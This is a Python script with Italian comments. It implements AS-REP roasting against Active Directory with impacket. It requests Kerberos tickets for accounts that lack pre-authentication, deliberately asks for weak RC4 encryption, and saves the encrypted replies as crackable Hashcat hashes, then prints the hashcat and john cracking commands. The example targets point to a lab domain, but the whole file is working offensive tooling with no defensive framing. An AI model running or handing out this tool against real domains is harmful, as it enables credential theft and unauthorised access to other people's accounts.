#!/usr/bin/env python3
"""
AS-REP Roasting Script - asreproast.py
Richiede TGT per utenti senza pre-autenticazione Kerberos ed estrae hash crackabili.

Teoria AS-REP Roasting:
    Normalmente, quando chiedi un TGT al DC, devi prima dimostrare di conoscere
    la password (pre-autenticazione): cripti un timestamp con la tua password e
    lo mandi al DC, che verifica. Solo dopo ti dà il TGT.

    Se la pre-autenticazione è disabilitata su un utente, puoi chiedere un TGT
    a nome suo senza dimostrare nulla. Il DC risponde con un AS-REP che contiene
    dati criptati con la password dell'utente.

    Quei dati criptati sono l'hash che cracki offline: provi milioni di password
    finché una produce lo stesso risultato. Nessun limite di tentativi perché
    il cracking avviene sulla tua macchina, non sul DC.
"""

import argparse
import json
import sys

from impacket.krb5.kerberosv5 import sendReceive, KerberosError
from impacket.krb5 import constants
from impacket.krb5.types import Principal, KerberosTime
from impacket.krb5.asn1 import AS_REQ, AS_REP, seq_set, seq_set_iter
from pyasn1.type.univ import noValue
from pyasn1.codec.der import decoder, encoder
import datetime
import random


def load_targets(enum_file):
    """
    Carica i target AS-REP Roasting dal file JSON dell'enumerazione.
    """
    with open(enum_file, 'r') as f:
        data = json.load(f)

    targets = data.get('asrep_targets', [])

    if not targets:
        print("[-] Nessun target AS-REP Roasting trovato nel file di enumerazione.")
        sys.exit(1)

    print(f"[+] Caricati {len(targets)} target dal file di enumerazione")
    return targets


def build_as_req(username, domain):
    """
    Costruisce un AS-REQ Kerberos senza pre-autenticazione.
    
    Il pacchetto dice al DC: "Voglio un TGT per questo utente"
    senza includere la prova di conoscere la password.
    """
    domain_upper = domain.upper()
    
    as_req = AS_REQ()
    as_req['pvno'] = 5
    as_req['msg-type'] = int(constants.ApplicationTagNumbers.AS_REQ.value)
    
    # KDC Options
    kdc_options = constants.encodeFlags(set([
        constants.KDCOptions.forwardable.value,
        constants.KDCOptions.renewable.value,
        constants.KDCOptions.proxiable.value,
    ]))
    
    req_body = seq_set(as_req, 'req-body')
    req_body['kdc-options'] = kdc_options
    req_body['realm'] = domain_upper
    
    # Client name (l'utente target)
    client_name = seq_set(req_body, 'cname')
    client_name['name-type'] = constants.PrincipalNameType.NT_PRINCIPAL.value
    seq_set_iter(client_name, 'name-string', [username])
    
    # Service name (krbtgt/DOMAIN)
    server_name = seq_set(req_body, 'sname')
    server_name['name-type'] = constants.PrincipalNameType.NT_SRV_INST.value
    seq_set_iter(server_name, 'name-string', ['krbtgt', domain_upper])
    
    # Timestamp
    now = datetime.datetime.now(datetime.timezone.utc)
    till = KerberosTime.to_asn1(now + datetime.timedelta(days=1))
    req_body['till'] = till
    req_body['rtime'] = till
    req_body['nonce'] = random.getrandbits(31)
    
    # Cifratura RC4 (etype 23) — più facile da crackare
    seq_set_iter(req_body, 'etype', [23])
    
    return as_req


def asrep_roast(dc_ip, domain, username):
    """
    Esegue AS-REP Roasting su un singolo utente.
    Restituisce l'hash in formato Hashcat mode 18200.
    """
    domain_upper = domain.upper()
    
    try:
        as_req = build_as_req(username, domain)
        message = encoder.encode(as_req)
        response = sendReceive(message, domain_upper, dc_ip)
        
        # Decodifica AS-REP
        as_rep = decoder.decode(response, asn1Spec=AS_REP())[0]
        
        # Estrai la parte criptata con la password dell'utente
        enc_part = as_rep['enc-part']
        etype = int(enc_part['etype'])
        cipher = bytes(enc_part['cipher']).hex()
        
        # Formato Hashcat mode 18200
        hash_str = f"$krb5asrep$23${username}@{domain_upper}:{cipher[:32]}${cipher[32:]}"
        
        print(f"  [+] {username} - Hash AS-REP catturato! (etype {etype})")
        return hash_str
        
    except KerberosError as e:
        error_code = e.getErrorCode()
        if error_code == constants.ErrorCodes.KDC_ERR_PREAUTH_REQUIRED.value:
            print(f"  [-] {username} - Pre-autenticazione richiesta (non vulnerabile)")
        elif error_code == constants.ErrorCodes.KDC_ERR_C_PRINCIPAL_UNKNOWN.value:
            print(f"  [-] {username} - Utente non trovato nel dominio")
        else:
            print(f"  [-] {username} - Errore Kerberos: {e}")
        return None
        
    except Exception as e:
        print(f"  [-] {username} - Errore: {e}")
        return None


def save_hashes(hashes, output_file):
    """
    Salva gli hash in un file, uno per riga.
    Formato pronto per Hashcat/John.
    """
    with open(output_file, 'w') as f:
        for h in hashes:
            f.write(h + '\n')

    print(f"\n[+] {len(hashes)} hash salvati in {output_file}")
    print(f"\n[*] Per crackare gli hash:")
    print(f"    hashcat -m 18200 {output_file} /path/to/wordlist.txt")
    print(f"    john --format=krb5asrep {output_file} --wordlist=/path/to/wordlist.txt")


def main():
    parser = argparse.ArgumentParser(
        description='AS-REP Roasting - Cattura hash Kerberos senza pre-autenticazione',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Esempi:
  python3 asreproast.py --dc-ip 192.168.56.10 --domain psychosec.local
  python3 asreproast.py --dc-ip 192.168.56.10 --domain psychosec.local --users f.conti e.neri
        """
    )

    parser.add_argument('--dc-ip', required=True, help='IP del Domain Controller')
    parser.add_argument('--domain', required=True, help='Nome dominio (es. psychosec.local)')
    parser.add_argument('--enum-file', default='enum_results.json', help='File JSON enumerazione (default: enum_results.json)')
    parser.add_argument('--users', nargs='+', help='Lista manuale di username target')
    parser.add_argument('-o', '--output', default='asrep_hashes.txt', help='File output hash (default: asrep_hashes.txt)')

    args = parser.parse_args()

    print("""
    ╔══════════════════════════════════════════╗
    ║       AS-REP ROASTING v1.0               ║
    ║       Target: {:<26s}║
    ╚══════════════════════════════════════════╝
    """.format(args.dc_ip))

    # Carica target
    if args.users:
        targets = args.users
        print(f"[+] Target manuali: {', '.join(targets)}")
    else:
        targets = load_targets(args.enum_file)

    print(f"\n[*] Avvio AS-REP Roasting su {len(targets)} target...\n")

    # Esegui AS-REP Roasting
    hashes = []
    for username in targets:
        h = asrep_roast(args.dc_ip, args.domain, username)
        if h:
            hashes.append(h)

    # Risultati
    if hashes:
        save_hashes(hashes, args.output)
        print(f"\n[+] AS-REP Roasting completato: {len(hashes)}/{len(targets)} hash catturati!")
    else:
        print("\n[-] Nessun hash catturato.")


if __name__ == '__main__':
    main()
